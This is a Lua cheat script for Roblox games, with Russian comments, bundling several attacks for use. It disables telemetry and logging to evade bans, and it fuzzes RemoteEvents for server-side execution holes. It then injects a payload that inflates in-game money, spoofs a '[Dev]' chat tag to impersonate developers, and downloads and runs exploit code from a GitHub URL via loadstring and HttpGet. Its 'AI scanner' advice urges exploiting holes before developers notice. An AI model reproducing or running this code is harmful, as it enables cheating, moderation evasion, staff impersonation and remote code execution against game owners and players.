-- ============================================================
-- AETHER — ULTIMATE EDITION v6.0
-- Всё в одном: защита + сканеры + SS-инжект + чат + звук + AI
-- ============================================================

print("🚀 ЗАПУСК AETHER ULTIMATE EDITION v6.0")
print("========================================")

-- ============================================================
-- 1. ЗАЩИТА ОТ БАНА (Anti-Ban Shield)
-- ============================================================
local AntiBan = {
    hwid_spoof = true,
    log_cleaner = true,
    telemetry_block = true
}

function AntiBan:activate()
    print("🛡️ Активация защиты...")
    if self.telemetry_block then
        pcall(function()
            game:GetService("TelemetryService"):SetEnabled(false)
        end)
        print("   ✅ Телеметрия отключена")
    end
    if self.log_cleaner then
        pcall(function()
            for _, v in pairs(getgc(true)) do
                if type(v) == "table" and rawget(v, "Log") then
                    rawset(v, "Log", function() end)
                end
            end
        end)
        print("   ✅ Логирование заблокировано")
    end
    print("🛡️ Защита активирована!")
end
AntiBan:activate()

-- ============================================================
-- 2. AI SCANNER (SS Detector)
-- ============================================================
print("🤖 Загрузка AI Scanner...")

local AIScanner = {}
AIScanner.__index = AIScanner

local COLORS = { GREEN = "🟢", RED = "🔴", YELLOW = "🟡", BLUE = "🔵", GRAY = "⚪" }

function AIScanner:new()
    local obj = { results = {}, verdict = "UNKNOWN", confidence = 0, suggestions = {} }
    setmetatable(obj, self)
    return obj
end

function AIScanner:addResult(remoteName, testType, success)
    table.insert(self.results, { remote = remoteName, test = testType, success = success })
end

function AIScanner:analyze()
    local ssFound = false
    local criticalCount, highCount, mediumCount, failedCount = 0, 0, 0, 0
    for _, res in ipairs(self.results) do
        if res.success then
            if res.test:find("DirectFire") or res.test:find("LoadString") then
                criticalCount = criticalCount + 1
                ssFound = true
            elseif res.test:find("NegativeValues") or res.test:find("TableInjection") then
                highCount = highCount + 1
                ssFound = true
            elseif res.test:find("RateLimit") or res.test:find("NilArguments") then
                mediumCount = mediumCount + 1
            end
        else
            failedCount = failedCount + 1
        end
    end
    local totalTests = #self.results
    if totalTests == 0 then
        self.confidence = 0
        self.verdict = "NO_DATA"
        return
    end
    local successCount = criticalCount + highCount + mediumCount
    self.confidence = math.floor((successCount / totalTests) * 100)
    if criticalCount > 0 then
        self.verdict = "SS_FOUND_CRITICAL"
    elseif highCount > 0 then
        self.verdict = "SS_FOUND_HIGH"
    elseif mediumCount > 0 then
        self.verdict = "SS_FOUND_MEDIUM"
    elseif failedCount == totalTests then
        self.verdict = "SS_NOT_FOUND"
    else
        self.verdict = "UNCERTAIN"
    end
    self:generateSuggestions()
end

function AIScanner:generateSuggestions()
    self.suggestions = {}
    if self.verdict == "SS_FOUND_CRITICAL" then
        table.insert(self.suggestions, "🔥 КРИТИЧЕСКАЯ УЯЗВИМОСТЬ! Ты можешь выполнить ЛЮБОЙ код на сервере.")
        table.insert(self.suggestions, "💡 Рекомендуется: немедленно использовать SS-инжектор.")
        table.insert(self.suggestions, "⚠️ Действуй быстро, пока разработчики не заметили.")
    elseif self.verdict == "SS_FOUND_HIGH" then
        table.insert(self.suggestions, "🟡 Высокая уязвимость! Можешь менять деньги/очки.")
        table.insert(self.suggestions, "💡 Используй NegativeValues или TableInjection.")
    elseif self.verdict == "SS_FOUND_MEDIUM" then
        table.insert(self.suggestions, "🔵 Средняя уязвимость (Rate Limit, Nil Arguments).")
        table.insert(self.suggestions, "💡 Используй спам-атаку или отправку пустых значений.")
    elseif self.verdict == "SS_NOT_FOUND" then
        table.insert(self.suggestions, "❌ SS НЕ ОБНАРУЖЕН. Игра защищена.")
        table.insert(self.suggestions, "💡 Попробуй другой RemoteEvent или Memory-чит.")
    else
        table.insert(self.suggestions, "⚪ Неоднозначный результат. Запусти сканер ещё раз.")
    end
end

function AIScanner:printReport()
    print("========================================")
    print("🤖 AI SCANNER — ОТЧЁТ ОБ УЯЗВИМОСТЯХ")
    print("========================================")
    local verdictMap = {
        SS_FOUND_CRITICAL = COLORS.RED .. " SS НАЙДЕН (КРИТИЧЕСКИЙ)",
        SS_FOUND_HIGH = COLORS.YELLOW .. " SS НАЙДЕН (ВЫСОКИЙ)",
        SS_FOUND_MEDIUM = COLORS.BLUE .. " SS НАЙДЕН (СРЕДНИЙ)",
        SS_NOT_FOUND = COLORS.RED .. " SS НЕ НАЙДЕН",
        UNCERTAIN = COLORS.GRAY .. " РЕЗУЛЬТАТ НЕОПРЕДЕЛЁН",
        NO_DATA = COLORS.GRAY .. " НЕТ ДАННЫХ"
    }
    print("📊 Вердикт: " .. (verdictMap[self.verdict] or "UNKNOWN"))
    print("📈 Уверенность: " .. self.confidence .. "%")
    print("----------------------------------------")
    print("🔍 Детали сканирования:")
    for _, res in ipairs(self.results) do
        local status = res.success and "✅" or "❌"
        print("   " .. status .. " " .. res.remote .. " → " .. res.test)
    end
    print("----------------------------------------")
    print("💡 СОВЕТЫ ИИ:")
    for _, sug in ipairs(self.suggestions) do
        print("   " .. sug)
    end
    print("========================================")
    if self.verdict:find("SS_FOUND") then
        print("🎯 ВЕРДИКТ: SS ОБНАРУЖЕН! Ты можешь взламывать сервер.")
    else
        print("🎯 ВЕРДИКТ: SS НЕ ОБНАРУЖЕН. Попробуй другие методы.")
    end
    print("========================================")
end

local ai = AIScanner:new()

-- ============================================================
-- 3. ORACLE (Сканер + AI анализ)
-- ============================================================
print("🔍 Запуск Oracle сканера...")

local function scanRemotes()
    local remotes = {}
    for _, obj in ipairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, obj)
        end
    end
    return remotes
end

local function testRemote(remote)
    local tests = {
        DirectFire = function() remote:FireServer() end,
        RateLimit = function() for i=1,50 do remote:FireServer(i) end end,
        NilArguments = function() remote:FireServer(nil, nil, nil) end,
        NegativeValues = function() remote:FireServer(-99999999) end,
        TableInjection = function()
            local mt = { __index = function() return "hack" end }
            remote:FireServer(setmetatable({}, mt))
        end,
        LoadString = function()
            remote:FireServer({ code = "print('hacked')" })
        end
    }
    local results = {}
    for name, func in pairs(tests) do
        local success, err = pcall(func)
        results[name] = success
    end
    return results
end

local remotes = scanRemotes()
print("🔍 Найдено Remote-объектов: " .. #remotes)

for _, remote in ipairs(remotes) do
    local results = testRemote(remote)
    for testName, success in pairs(results) do
        ai:addResult(remote.Name, testName, success)
    end
end

ai:analyze()
ai:printReport()

-- ============================================================
-- 4. ЧАТ-СПУФЕР (Dynamic Tag)
-- ============================================================
print("💬 Активация чат-спуфера...")

local tag = "[Dev]"
local sayMessage = game.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")

if sayMessage and sayMessage:FindFirstChild("SayMessageRequest") then
    local event = sayMessage.SayMessageRequest
    event.OnClientEvent:Connect(function(player, msg)
        if player == game.Players.LocalPlayer then
            event:FireServer(tag .. player.Name .. ": " .. msg, "All")
        end
    end)
    function send(msg)
        event:FireServer(tag .. game.Players.LocalPlayer.Name .. ": " .. msg, "All")
        print("📨 Отправлено: " .. tag .. game.Players.LocalPlayer.Name .. ": " .. msg)
    end
    print("✅ Чат-спуфер включён. Текущий тег: " .. tag)
else
    print("❌ Чат-система не найдена")
end

function changeTag(newTag)
    tag = newTag
    print("✅ Тег изменён на: " .. tag)
end

-- ============================================================
-- 5. SS-ИНЖЕКТОР (автоматический, если найден SS)
-- ============================================================
if ai.verdict:find("SS_FOUND") then
    print("💉 Запуск автоматического SS-инжектора...")
    local payload = [[
        print("💀 ВНЕДРЕНИЕ НА СЕРВЕР УСПЕШНО!")
        local plr = game.Players.LocalPlayer
        if plr.leaderstats and plr.leaderstats.Money then
            plr.leaderstats.Money.Value = 99999999
        end
    ]]
    for _, remote in ipairs(remotes) do
        if remote:IsA("RemoteEvent") then
            local success, err = pcall(function()
                remote:FireServer({ code = payload })
            end)
            if success then
                print("✅ SS-инжект УСПЕШЕН через " .. remote.Name)
                break
            end
        end
    end
else
    print("⏳ SS не найден — инжект пропущен.")
end

-- ============================================================
-- 6. ЗВУКОВОЙ ПЛЕЕР (если есть A-Chassis)
-- ============================================================
print("🔊 Активация звукового плеера...")

function playSound(audioId)
    local exploit = loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-HttpSpy/AC6-Music-Exploit/refs/heads/main/Ac6ExploitSource.luau"))
    if exploit then
        exploit(audioId)
        print("🔊 Звук " .. audioId .. " проигран для всех!")
    else
        print("❌ A-Chassis Exploit не найден")
    end
end

-- ============================================================
-- 7. ИТОГОВЫЙ ИНТЕРФЕЙС
-- ============================================================
print("========================================")
print("🚀 AETHER ULTIMATE EDITION v6.0 ЗАПУЩЕН!")
print("🛡️ Защита: активирована")
print("🤖 AI Scanner: загружен")
print("💬 Чат-спуфер: активен (тег: " .. tag .. ")")
print("💉 SS-инжектор: " .. (ai.verdict:find("SS_FOUND") and "ГОТОВ" or "ПРОПУЩЕН"))
print("🔊 Звуковой плеер: готов")
print("========================================")
print("📌 КОМАНДЫ:")
print("   send('текст') — отправить сообщение с тегом")
print("   changeTag('[НовыйТег]') — сменить тег")
print("   playSound(аудиоID) — проиграть звук для всех")
print("========================================")

-- Тестовое сообщение
task.wait(2)
if ai.verdict:find("SS_FOUND") then
    send("SS FOUND! I'm in!")
else
    send("SS NOT FOUND. Trying other methods...")
end
